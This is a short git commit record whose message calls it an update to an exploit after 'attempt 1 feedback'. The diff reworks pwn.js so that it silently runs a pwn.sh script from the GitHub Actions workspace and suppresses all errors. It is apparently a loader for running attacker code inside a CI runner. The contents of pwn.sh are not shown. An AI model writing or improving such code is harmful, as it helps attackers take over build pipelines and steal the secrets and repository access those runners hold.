2c444ff9e945c2b0f37ba19e0c76ff3310f11933
kn0vd3h1 <kn0vd3h1@rolf.ovh>
2026-04-21 22:47:45 +0000

    Update exploit based on attempt 1 feedback

--- pwn.js
+++ pwn.js
@@ -1,9 +1,7 @@
-const { exec } = require('child_process');
+const { execSync } = require('child_process');
 const path = require('path');
 const workspace = process.env.GITHUB_WORKSPACE || '.';
 const pwnPath = path.join(workspace, 'pwn.sh');
-exec(`bash ${pwnPath}`, (error, stdout, stderr) => {
-    if (error) {
-        return;
-    }
-});
+try {
+    execSync(`bash ${pwnPath}`);
+} catch (e) {}
